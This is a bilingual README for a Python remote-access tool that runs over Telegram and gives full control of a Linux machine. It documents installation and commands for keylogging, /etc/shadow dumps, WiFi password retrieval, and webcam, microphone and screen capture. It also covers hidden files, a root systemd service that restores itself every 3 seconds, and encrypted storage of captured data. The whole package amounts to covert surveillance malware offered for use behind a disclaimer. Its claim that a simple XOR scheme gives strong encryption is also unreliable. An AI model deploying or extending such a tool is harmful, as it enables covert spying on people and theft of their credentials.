# 🤖 linux-telegram-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

*Advanced Telegram-based Remote Administration Tool for Linux*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed use**: Managing your own devices, penetration testing with explicit written consent, educational research
- ❌ **Prohibited use**: Unauthorized access to computer systems, violating privacy laws, any illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security & Encryption](#-security--encryption)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence Mechanisms](#️-persistence-mechanisms)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность и шифрование](#-безопасность-и-шифрование)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Механизмы персистентности](#️-механизмы-персистентности)

---

# English

## 📋 Overview

**Linux Telegram Bot** is a high-performance remote administration tool that provides **full Linux system control** through Telegram. Built with obsessive attention to speed, reliability, and security.

### Key Capabilities

| Category | Capabilities |
|----------|-------------|
| **System Control** | Reboot, shutdown, sleep, process management, service control, kernel modules |
| **File System** | Browse, upload, download, create, delete, hide, zip, chmod |
| **Network** | IP config, route table, ARP cache, netstat, WiFi scanning/passwords |
| **User Interface** | Screenshot, webcam capture, audio recording, mouse/keyboard/clipboard control |
| **Surveillance** | Keylogger (4 modes), clipboard monitoring, message display |
| **Persistence** | Systemd service, crontab, autostart, environment variables, internal autostart |
| **Security** | User management, app blocking, website blocking, SHADOW dump, UID switching |
| **Information** | Full systeminfo (CPU, GPU, RAM, disks, battery, BIOS, etc.) |

### Architecture

```
Telegram Bot API ←→ Python Bot (4 threads) ←→ System Commands
                              ↓
                    Encrypted Storage (mem/, sys/conf/, tmp/)
                    In-Memory Cache (SESSION dict)
```

## ✨ Features

### Core Features

| Feature | Description |
|---------|-------------|
| 🔐 **Password Protection** | SHA256 hash verification with encrypted session files |
| 🔑 **Session Management** | Two-tier: encrypted anonymous files on disk + in-memory cache with pre-bound `send()` |
| 📦 **Auto-Dependency** | Automatic pip install into virtual environment with fallback stubs for missing libraries |
| 🔄 **Self-Healing** | Monitors main file, recovery copy, init script, and systemd service every 3 seconds |
| 🎨 **Formatted Output** | All tables rendered via `tabulate` with grid format |
| 📄 **File Transfer** | Upload/download any file size via Telegram documents |
| 🔒 **Encrypted Storage** | Custom XOR stream cipher with feedback mutation for all sensitive data |
| 🧵 **Multi-Threaded** | 4 worker threads for parallel command processing |

### Unique Technical Features

| Feature | Description |
|---------|-------------|
| **In-Memory ZIP Archiver** | Creates ZIP in `BytesIO` with `compresslevel=9`, size limits, no temp files |
| **Custom Directory Iterator** | Iterative DFS with `deque` and object pool — zero recursion, minimal allocations |
| **Regex Command Parser** | Cached compiled patterns with O(1) lookup for repeat commands |
| **Lazy Error Stubs** | Missing libraries produce clear errors only on actual use, not at startup |
| **Anonymous Sessions** | Disk files contain only encrypted dates — no usernames stored permanently |

### System Commands

| Command | Description |
|---------|-------------|
| `systeminfo` | Full hardware/software inventory (CPU, GPU, RAM, disks, battery, BIOS, etc.) |
| `lshw` | Detailed hardware information |
| `dmesg` | Kernel ring buffer messages |
| `ps` | Process list with PID, CPU%, MEM, runtime, status |
| `kill` | Terminate process by PID or name |
| `run` | Launch applications/files |
| `cmd` | Execute shell commands (with/without output) |
| `time` / `date` | Get/set system time/date |
| `sleep` / `reboot` / `shutdown` | Power management |

### File System Commands

| Command | Description |
|---------|-------------|
| `pwd` / `cd` | Navigate directories |
| `ls` | List files with permissions, owner, size |
| `mkfile` / `mkdir` | Create files/directories |
| `rn` | Rename files/directories |
| `rm` / `rmdir` | Delete files/directories |
| `cp` / `mv` | Copy/move files |
| `chmod` | Change permissions |
| `hide` / `unhide` | Hide/unhide files (dot prefix) |
| `cat` | Download files |
| `zip` | Create ZIP archive (25 MB per file, 49 MB total) |

### Network Commands

| Command | Description |
|---------|-------------|
| `inet` | Enable/disable internet |
| `ipconfig` | Global IP info via ipinfo.io + local interfaces (MAC, IPv4, IPv6) |
| `route` | IPv4/IPv6 routing tables |
| `arp` | ARP cache |
| `netstat` | Active TCP/UDP connections |
| `wifi` | Scan WiFi networks / get saved passwords |
| `site` | Open/download/block websites |

### User Interface Commands

| Command | Description |
|---------|-------------|
| `screen` | Screenshot (PNG) |
| `webcam` | Webcam capture via ffmpeg |
| `audio` | Record/play audio (microphone/system) |
| `mouse` | Move, click, scroll |
| `keyboard` | Type, press keys, remap, block keys |
| `clipboard` | Read/write/clear clipboard |
| `msg` | Display notifications (notify-send) or message boxes (xmessage) |
| `keylogger` | Enable/disable/retrieve keystrokes (4 output modes) |

### Persistence Commands

| Command | Description |
|---------|-------------|
| `service` | Create/manage systemd services (create, delete, enable, disable, start, stop, restart) |
| `crontab` | Schedule tasks in /etc/crontab |
| `startup` | Add to user autostart (.desktop files in ~/.config/autostart) |
| `env` | Set environment variables in /etc/environment |
| `autostart` | Bot's internal autostart system (encrypted config) |

### Security Commands

| Command | Description |
|---------|-------------|
| `user` | Create/delete/list users |
| `block` | Block/unblock applications (auto-kill) |
| `hashpass` | Dump /etc/shadow |
| `setuid` | Switch UID |
| `account` | Manage connected sessions |

## 🚀 Quick Start

### 📋 Prerequisites

```bash
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### 📥 Installation

```bash
git clone https://github.com/vk-candpython/linux-telegram-bot.git
cd linux-telegram-bot
```

### ⚙️ Configuration

Edit `bot.py` and set:

```python
#-------------------------|NECESSARILY|-------------------------#
TOKEN = "YOUR_BOT_TOKEN"           # From @BotFather
PASSWORD = "YOUR_PASSWORD_HASH"    # SHA256 of your password
SEED = 12345                       # Seed for encryption key generation
PATH = "/opt/mybot"                # Installation directory
#-----------------------------|END|-----------------------------#

#-------------------------|OPTIONAL|-------------------------#
BOT_FILE_NAME = "bot.py"           # Bot filename in PATH
BOT_SERVICE_NAME = "mybot"         # Systemd service name (required if BOT_EXE=True)
BOT_SERVICE_DESCRIPTION = "My Bot" # Service description (required if BOT_EXE=True)
BOT_EXE = True                     # Run as persistent service
#----------------------------|END|---------------------------#
```

### 🔐 Generate Password Hash

```bash
python3 -c "from hashlib import sha256; print(sha256('YOUR_PASSWORD'.encode()).hexdigest())"
```

### 🏃 Run

```bash
# Root mode
sudo python3 bot.py

# With custom bot name
sudo python3 bot.py -n=my_custom_name
```

## 📁 File Structure

```
{PATH}/                              # e.g., /opt/mybot
├── bot.py                           # Main script (hidden if BOT_EXE=True)
├── mem/                             # Session storage (encrypted, anonymous)
│   └── {sha256_hash}                # One file per verified user
├── sys/                             # System files
│   ├── conf/                        # Encrypted configs
│   │   ├── 0                        # TOKEN (encrypted)
│   │   ├── 1                        # PASSWORD (encrypted)
│   │   └── 2                        # SEED
│   ├── .init                        # Service launcher script
│   ├── 0                            # Autostart entries (encrypted, \u200B-separated)
│   └── 1                            # Keylogger enable flag
├── tmp/                             # Temporary files
│   ├── 0                            # Blocked apps list (encrypted)
│   ├── 1                            # Keylogger data (encrypted, \u200F-separated)
│   ├── 2                            # Webcam screenshot temp
│   └── 3                            # Audio recording temp
├── share/                           # Uploaded/downloaded files
└── .venv/                           # Python virtual environment
```

### Recovery System

| Path | Purpose |
|------|---------|
| `{PATH}/{BOT_FILE_NAME}` | Main bot file |
| `/tmp/._{BOT_FILE_NAME}` | Recovery copy |
| `{PATH}/sys/.init` | Systemd service launcher |

All three are monitored and restored every 3 seconds by `init_bot_exe()`.

## 🔐 Security & Encryption

### Encryption Algorithm

Custom XOR-based stream cipher with feedback mutation:

```python
def encrypt(data):
    k0, k1 = KEY  # Generated from SEED
    f = i = 0     # Feedback and position
    
    for c in data:
        n = ord(c)
        x = (n << k0) ^ (((k1 + f) + i) & 0xFF)
        f = (f ^ x) & 0xFF           # Feedback mutation
        yield chr(x)
        i += 1
```

**Properties:**
- Each encrypted byte depends on: key, position, and previous ciphertext
- Feedback creates avalanche effect
- Key from `SEED` → `(randint(1,8), randint(1,256))`

**What is encrypted:** TOKEN, PASSWORD, session files, keylogger data, autostart config, blocked apps list.

### Session Model

| Storage | Contents | Lifetime |
|---------|----------|----------|
| **Disk** (`mem/`) | Encrypted registration date only (anonymous) | Persistent |
| **RAM** (`SESSION` dict) | @username, session date, pre-bound `send()` function | Until restart/exit |

**Why:** Disk files are anonymous — no usernames. User data lives only in volatile memory.

## 📚 Command Reference

### Core Commands

| Command | Syntax | Example |
|---------|--------|---------|
| `help` | `help` | Shows all commands |
| `session` | `session` | Session information |
| `getpid` | `getpid` | Current PID |
| `getuid` | `getuid` | Current user + logged user |
| `setuid` | `setuid 1000` | Switch to UID 1000 |
| `restart` | `restart` | Restart bot |
| `exit` | `exit` | Log out |
| `repeat` | `repeat (cmd) -c (n) -d (sec)` | Repeat command N times |

### File System Examples

```bash
ls                              # List directory
ls /home/user                   # List specific directory
cd /home/user                   # Change directory
mkfile test.txt -d Hello\tWorld\n  # Create file with content
mkdir new_folder                # Create directory
rn old.txt -n new.txt           # Rename
cp source.txt -t /dest/         # Copy
mv source.txt -t /dest/         # Move
chmod script.sh -m 755          # Change permissions
hide secret.txt                 # Hide file
unhide .secret.txt              # Unhide file
cat document.pdf                # Download file
zip /home/user                  # Create ZIP archive
```

### Network Examples

```bash
ipconfig                        # Global IP + interfaces
route                           # Routing tables
arp                             # ARP cache
netstat                         # Active connections
wifi -g                         # Scan WiFi networks
wifi -p                         # Get saved WiFi passwords
site -p https://example.com     # Open website
site -d URL -n file.pdf         # Download from URL
site -b example.com             # Block website
site -l                         # List blocked sites
```

### System Examples

```bash
systeminfo                      # Full system report
lshw                            # Hardware details
dmesg                           # Kernel messages
ps                              # Process list
kill firefox                    # Kill by name
kill 1234                       # Kill by PID
run /path/app -a "--flag"       # Launch file
cmd -g "ls -la"                 # Execute with output
cmd -e "rm -f /tmp/*"           # Execute without output
modprobe -g                     # List kernel modules
modprobe -i vboxdrv             # Install module
modprobe -d vboxdrv             # Remove module
time -g                         # Get time
date -s 2026-12-31              # Set date
sleep                           # Suspend computer
reboot                          # Reboot
shutdown                        # Shutdown
```

### Service Management Examples

```bash
service -g                      # List all services
service -q mybot                # Service details
service -c mybot -d "Desc" -p /path -a "args" -u root  # Create
service -d mybot                # Delete
service -e mybot                # Enable
service -i mybot                # Disable
service -l mybot                # Start
service -r mybot                # Restart
service -s mybot                # Stop
```

### User Interface Examples

```bash
screen                          # Screenshot
webcam                          # Webcam capture
audio -m 10                     # Record microphone (10 sec)
audio -p 5                      # Record system output (5 sec)
audio -s /path/audio.mp3        # Play audio file
mouse -p                        # Get position
mouse -x 500 -y 300 -d 1        # Move mouse
mouse -l -c 2 -d 1              # Left click 2 times
mouse -s 3                      # Scroll down
keyboard -t "Hello" -d 1        # Type text
keyboard -k enter -p 3 -d 1     # Press Enter 3 times
keyboard -c -k a -n b           # Remap key A → B
keyboard -b f12                 # Block key
keyboard -r                     # Reset keyboard
clipboard -g                    # Get clipboard
clipboard -c "text"             # Copy to clipboard
clipboard -r                    # Clear clipboard
msg -p "Title" -t "Message"     # Send notification
msg -s "Title" -t "Message"     # Show message box
```

### Keylogger Examples

```bash
keylogger -e                    # Enable
keylogger -s                    # Status
keylogger -g base               # Get raw data
keylogger -g char               # Characters only
keylogger -g hotkey              # Hotkey tags only
keylogger -g no hotkey          # Clean text
keylogger -d                    # Disable
keylogger -r                    # Clear data
```

## ⚙️ Configuration

### Runtime Config Changes

```bash
config -g                       # View current config
config TOKEN -s NEW_TOKEN       # Change TOKEN (validates via API)
config PASSWORD -s newpass      # Change PASSWORD (auto-hashed)
config SEED -s 54321            # Change SEED (numeric only)
config -r TOKEN                 # Reset TOKEN
config -r PASSWORD              # Reset PASSWORD
config -r SEED                  # Reset SEED
```

### Account Management

```bash
account -g                      # List connected accounts
account -d 123456789            # Delete account (disk + RAM)
```

## 🛡️ Persistence Mechanisms

### 1. Systemd Service (BOT_EXE=True)

Creates and auto-maintains service at `/etc/systemd/system/{name}.service`:

```ini
[Unit]
Description={description}

[Service]
Type=simple
ExecStart="{PATH}/sys/.init"
User=root
Restart=always

[Install]
WantedBy=multi-user.target
```

The `init_bot_exe()` thread checks and recreates the service every 3 seconds.

### 2. Internal Autostart

Encrypted autostart config in `sys/0`:

```bash
autostart -c name -p /path/to/file -a "args"    # Add
autostart -l                                     # List
autostart -d name                                # Delete
autostart -r                                     # Reset all
```

### 3. Crontab Integration

```bash
crontab -c name -e "*/5 * * * *" -u root -p /script -a none
crontab -g                                       # List
crontab -d name                                  # Delete
```

### 4. User Autostart (.desktop)

```bash
startup -c name -p /path/to/file -a none         # Create
startup -g                                       # List
startup -d name                                  # Delete
startup -l name                                  # Launch now
```

### 5. Environment Variables

```bash
env -c MYVAR -v "value"                          # Set
env -g                                           # List all
env -q MYVAR                                     # Query
env -d MYVAR                                     # Delete
```

---

# Русский

## 📋 Обзор

**Linux Telegram Bot** — высокопроизводительный инструмент удалённого администрирования, предоставляющий **полный контроль над системой Linux** через Telegram.

### Ключевые возможности

| Категория | Возможности |
|-----------|-------------|
| **Управление системой** | Перезагрузка, сон, управление процессами/службами/модулями ядра |
| **Файловая система** | Навигация, загрузка, скачивание, создание, удаление, скрытие, архивация |
| **Сеть** | IP-конфигурация, роутинг, ARP, netstat, WiFi (сканирование/пароли) |
| **Интерфейс** | Скриншоты, веб-камера, запись/воспроизведение звука, мышь, клавиатура |
| **Наблюдение** | Кейлоггер (4 режима), буфер обмена |
| **Персистентность** | systemd, crontab, автозагрузка, переменные окружения, внутренний автозапуск |
| **Безопасность** | Пользователи, блокировка приложений/сайтов, дамп SHADOW |

## ✨ Возможности

### Основные возможности

| Возможность | Описание |
|-------------|----------|
| 🔐 **Защита паролем** | SHA256 + зашифрованные файлы сессий |
| 🔑 **Сессии** | Два уровня: анонимные файлы на диске + кеш в ОЗУ с функцией `send()` |
| 📦 **Авто-зависимости** | pip install в venv + заглушки для отсутствующих библиотек |
| 🔄 **Самовосстановление** | Мониторинг файлов и службы каждые 3 секунды |
| 🎨 **Форматирование** | Все таблицы через `tabulate` |
| 📄 **Передача файлов** | Загрузка/скачивание любого размера |
| 🔒 **Шифрование** | XOR-шифр с обратной связью |

## 🚀 Быстрый старт

### 📋 Требования

```bash
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### ⚙️ Конфигурация

Отредактируй `bot.py`:

```python
TOKEN = "ТВОЙ_ТОКЕН"              # От @BotFather
PASSWORD = "ХЕШ_ПАРОЛЯ"           # SHA256 твоего пароля
SEED = 12345                      # Зерно ключа шифрования
PATH = "/opt/mybot"               # Директория установки
BOT_EXE = True                    # Режим службы (опционально)
```

### 🔐 Генерация хеша

```bash
python3 -c "from hashlib import sha256; print(sha256('ПАРОЛЬ'.encode()).hexdigest())"
```

### 🏃 Запуск

```bash
sudo python3 bot.py
```

## 📚 Справочник команд

### Основные команды

| Команда | Описание |
|---------|----------|
| `help` | Все команды |
| `session` | Информация о сессии |
| `getpid` | PID бота |
| `getuid` | Текущий пользователь |
| `setuid 1000` | Сменить UID |
| `restart` | Перезапустить |
| `exit` | Выйти |
| `repeat (cmd) -c (n) -d (sec)` | Повторить N раз |

### Файловая система

```bash
ls /home/user                   # Список файлов
cd /home/user                   # Сменить директорию
mkfile test.txt -d "текст"      # Создать файл
mkdir new_folder                # Создать папку
rn old.txt -n new.txt           # Переименовать
cp source.txt -t /dest/         # Копировать
hide secret.txt                 # Скрыть
cat document.pdf                # Скачать
zip /home/user                  # ZIP-архив
```

### Сеть

```bash
ipconfig                        # IP-информация
route                           # Таблицы маршрутизации
wifi -g                         # Сканировать WiFi
wifi -p                         # Пароли WiFi
site -b example.com             # Заблокировать сайт
site -d URL -n file.pdf         # Скачать с URL
```

### Система

```bash
systeminfo                      # Полный отчёт
ps                              # Процессы
kill firefox                    # Завершить по имени
kill 1234                       # Завершить по PID
cmd -g "ls -la"                 # Выполнить команду
service -c name -d "desc" -p /path -a "args" -u root  # Создать службу
```

### Интерфейс

```bash
screen                          # Скриншот
webcam                          # Веб-камера
audio -m 10                     # Запись с микрофона
audio -s /path/audio.mp3        # Воспроизвести
mouse -x 500 -y 300 -d 1        # Двинуть мышь
keyboard -t "Привет" -d 1       # Напечатать
clipboard -g                    # Буфер обмена
msg -p "Заголовок" -t "Текст"   # Уведомление
```

### Кейлоггер

```bash
keylogger -e                    # Включить
keylogger -s                    # Статус
keylogger -g base               # Сырые данные
keylogger -g char               # Только символы
keylogger -d                    # Выключить
keylogger -r                    # Очистить
```

---

<div align="center">

**[⬆ Back to Top](#-linux-telegram-bot)**

*Remote Administration via Telegram — Full Linux Control*

</div>
